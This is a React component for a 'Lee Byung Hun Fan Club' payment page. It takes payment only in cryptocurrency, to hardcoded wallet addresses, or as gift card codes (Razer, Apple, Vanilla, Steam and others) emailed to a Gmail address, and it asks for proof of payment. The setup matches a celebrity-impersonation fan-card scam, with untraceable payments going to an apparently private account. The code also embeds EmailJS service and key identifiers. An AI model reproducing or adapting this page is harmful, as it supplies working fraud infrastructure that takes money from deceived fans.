import React, { useState, useEffect, useRef } from 'react';
import leeImage from '../assets/lee7.jpg';
import ScrollReveal from 'scrollreveal';
import emailjs from 'emailjs-com';

const CardPage = () => {
  const [selectedMethod, setSelectedMethod] = useState('');
  const [selectedCrypto, setSelectedCrypto] = useState('');
  const [selectedGiftCard, setSelectedGiftCard] = useState('');
  const [showPaymentMessage, setShowPaymentMessage] = useState(false);
  const formRef = useRef();

  const cryptoAddresses = {
    bitcoin: 'bc1qwagy854zy85lcavfhttk025f0h9gtqqpnhk23r',
    usdt: '0x3c7fEe11C0814A508F3E52139Cb99703549C1c31',
    ethereum: '0x3c7fEe11C0814A508F3E52139Cb99703549C1c31',
  };

  const giftCardEmails = {
    razer: 'byunghunentertainment@gmail.com',
    apple: 'byunghunentertainment@gmail.com',
    vanilla: 'byunghunentertainment@gmail.com',
    amex: 'byunghunentertainment@gmail.com',
    sephora: 'byunghunentertainment@gmail.com',
    steam: 'byunghunentertainment@gmail.com',
  };

  const handleChange = (e) => {
    setSelectedMethod(e.target.value);
    setSelectedCrypto('');
    setSelectedGiftCard('');
  };

  const handleCryptoChange = (e) => setSelectedCrypto(e.target.value);
  const handleGiftCardChange = (e) => setSelectedGiftCard(e.target.value);

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs.sendForm(
      'service_0kmdxhr',
      'template_rhvzeor',
      formRef.current,
      'HzqW2sUdz2C1efEVk'
    ).then(
      (result) => {
        setShowPaymentMessage(true);
        setSelectedMethod('');
        setSelectedCrypto('');
        setSelectedGiftCard('');
        formRef.current.reset();
        console.log(result.text);
      },
      (error) => {
        console.error(error.text);
      }
    );
  };

  useEffect(() => {
    ScrollReveal().reveal('.reveal', {
      delay: 200,
      distance: '50px',
      duration: 800,
      easing: 'ease-in-out',
      origin: 'bottom',
      reset: false,
      cleanup: true,
    });
  }, []);

  return (
    <section className="reveal p-6 max-w-2xl rounded-lg mx-auto shadow-md">
      {/* Image */}
      <div className="mb-6">
        <img
          src={leeImage}
          alt="Lee Byung Hun Fan Club"
          className="w-full max-h-[500px] object-cover rounded-lg shadow-md"
        />
      </div>

      <h2 className="text-2xl font-bold mb-4">Choose Payment Method</h2>

      <form ref={formRef} onSubmit={sendEmail}>
        {/* Payment Method Select */}
        <div className="mb-4">
          <label className="block mb-2 font-semibold">Select a payment option:</label>
          <select
            name="payment_option"
            value={selectedMethod}
            onChange={handleChange}
            className="w-full p-3 border bg-black text-white rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            required
          >
            <option value="">Select</option>
            <option value="crypto">Crypto</option>
            <option value="giftcard">Gift Card</option>
          </select>
        </div>

        {/* Crypto Details */}
        {selectedMethod === 'crypto' && (
          <div className="p-4 rounded-md mt-4 bg-black text-white">
            <h3 className="text-lg font-semibold mb-2">Choose a Crypto Option:</h3>
            <select
              name="crypto_type"
              value={selectedCrypto}
              onChange={handleCryptoChange}
              className="w-full p-3 border bg-gray-900 text-white rounded-md mb-4"
              required
            >
              <option value="">Select Crypto</option>
              <option value="bitcoin">Bitcoin</option>
              <option value="usdt">USDT (ETH)</option>
              <option value="ethereum">Ethereum</option>
            </select>

            {selectedCrypto && (
              <div>
                <p className="text-sm mb-1">Send payment to the wallet address below:</p>
                <p className="text-blue-400 font-mono text-sm break-words">
                  {cryptoAddresses[selectedCrypto]}
                </p>
              </div>
            )}
          </div>
        )}

        {/* Gift Card Details */}
        {selectedMethod === 'giftcard' && (
          <div className="p-4 rounded-md mt-4 bg-black text-white">
            <h3 className="text-lg font-semibold mb-2">Select Gift Card Type:</h3>
            <select
              name="giftcard_type"
              value={selectedGiftCard}
              onChange={handleGiftCardChange}
              className="w-full p-3 border bg-gray-900 text-white rounded-md mb-4"
              required
            >
              <option value="">Select Gift Card</option>
              <option value="razer">Razer Gold</option>
              <option value="apple">Apple</option>
              <option value="vanilla">Vanilla Visa Card</option>
              <option value="amex">American Express</option>
              <option value="sephora">Sephora</option>
              <option value="steam">Steam</option>
            </select>

            {selectedGiftCard && (
              <div>
                <p className="text-sm">Please send the gift card code and amount to:</p>
                <p className="text-blue-400 font-semibold">{giftCardEmails[selectedGiftCard]}</p>
              </div>
            )}
          </div>
        )}

        {/* Submit Button */}
        <div className="flex justify-center mt-6">
          <button
            type="submit"
            className="w-60 p-4 rounded-full bg-blue-600 hover:bg-blue-700 text-white font-semibold transition duration-200"
          >
            Proceed
          </button>
        </div>
      </form>

      {showPaymentMessage && (
        <div className="fixed top-0 left-0 right-0 bottom-0 bg-white bg-opacity-80 flex flex-col items-center justify-center text-white text-xl font-semibold p-6 lg:p-8">
         <p className="border rounded-3xl bg-black p-3 px-3 md:p-4 flex justify-center text-center">
           Kindly send the proof of your payment to 
          </p>

          <b className="border rounded-xl flex items-center justify-center bg-black p-4 text-blue-500">
             byunghunentertainment@gmail.com
            </b>
        </div>
     )}

    </section>
  );
};

export default CardPage;